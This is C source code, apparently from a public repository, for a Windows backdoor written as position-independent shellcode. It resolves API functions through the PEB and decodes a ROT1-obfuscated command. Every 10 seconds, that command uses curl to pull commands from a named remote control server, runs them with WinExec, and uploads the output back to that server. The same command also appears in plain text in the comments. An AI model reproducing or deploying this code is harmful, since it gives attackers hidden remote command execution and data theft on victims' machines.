//Author: Shaddy43
//Designation: Cybersecurity Engineer, reverse engineer and malware developr
//Original credits to hasherezade of vxunderground who gave the methodology of creating postion independent shellcode
//I've followed the methodology to create a complete custom backdoor communicating on c3 using https and APIs

//This code is called position independent code because it doesn't depend on a linker to resolve external dependencies like importing dlls and using functions inside.
//This backdoor uses cmd to get commands from the c3 server after every 10 seconds and execute it on the system.
//The executed command is saved into a text file and then uploaded back to the c3 server.
//If we are not using stack-based strings, then we must inline-string in text section from data section for shellcode to work properly. I've used another tool for inlining strings: https://github.com/hasherezade/masm_shc
//With the help of MSVC we can convert this code to .asm file and then link those assembly instructions to a binary.
//After that we can extract shellcode from the .text section of that binary.

#include<windows.h>
#include "peb_lookup.h"

// It's worth noting that strings can be defined inside the .text section:
#pragma code_seg(".text")

void rot1(char*, size_t, bool);

int main()
{
    // Stack based strings for libraries and functions the shellcode needs
    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };

    // stack based strings to be passed to the winexec api
    //This string_cmd takes commands from the c3 server, executes those commands on the system, saves the output in a text file and then uploads the output back to the c3 server!
    //char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};
    //LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl https://r.baalejibreel.com/shaddy/data.php') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" https://r.baalejibreel.com/shaddy/getfile.php\" ";
    char cmd[] = "dne/fyf!0d!#gps!0g!#efmjnt>#!&j!jo!)(dvsm!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0ebub/qiq(*!ep!tfu!pvuqvu>&j!''!&j!?!D;]vtfst]qvcmjd]ufnq/uyu!''!dvsm!..gpsn!#gjmfUpVqmpbe>AD;]vtfst]qvcmjd]ufnq/uyu#!iuuqt;00s/cbbmfkjcsffm/dpn0tibeez0hfugjmf/qiq#!";
    //char load_library_name[] = "MpbeMjcsbszB";
    //char get_proc_address[] = "HfuQspdBeesftt";
    //char winExec_name[] = "XjoFyfd";
    //char sleep_name[] = "Tmffq";

	// resolve kernel32 image base
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) {
        return 1;
    }

    // resolve loadlibraryA() address along with encoding and decoding
    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
    if (!load_lib) {
        return 2;
    }

    // resolve getprocaddress() address along with encoding and decoding
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
    if (!get_proc) {
        return 3;
    }

    // loadlibrarya and getprocaddress function definitions
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

    UINT(WINAPI * _WinExec)(
        _In_ LPCSTR lpCmdLine,
        _In_ UINT uCmdShow) = (UINT (WINAPI*)(
            _In_ LPCSTR,
            _In_ UINT)) _GetProcAddress((HMODULE)base, (LPCSTR)"WinExec");
    if (_WinExec == NULL) return 4;

    VOID(WINAPI * _Sleep)(
        _In_ DWORD dwMilliseconds) = (VOID (WINAPI*)(
            _In_ DWORD)) _GetProcAddress((HMODULE)base, (LPCSTR)"Sleep");
    if (_Sleep == NULL) return 5;

    rot1(cmd, sizeof(cmd), true);
    while(true)
	{
		UINT return_val = _WinExec(cmd, 0);
        _Sleep(10000);
	}
    rot1(cmd, sizeof(cmd), false);

    //rot1(cmd, sizeof(cmd), true);
    //UINT return_val = _WinExec(cmd, 0);
    //rot1(cmd, sizeof(cmd), false);

    return 0;
}

void rot1(char* str, size_t str_size, bool decode)
{
    for (size_t i = 0; i < str_size - 1; i++) {
        if (decode) {
            str[i] -= 1;
        }
        else {
            str[i] += 1;
        }
    }
}

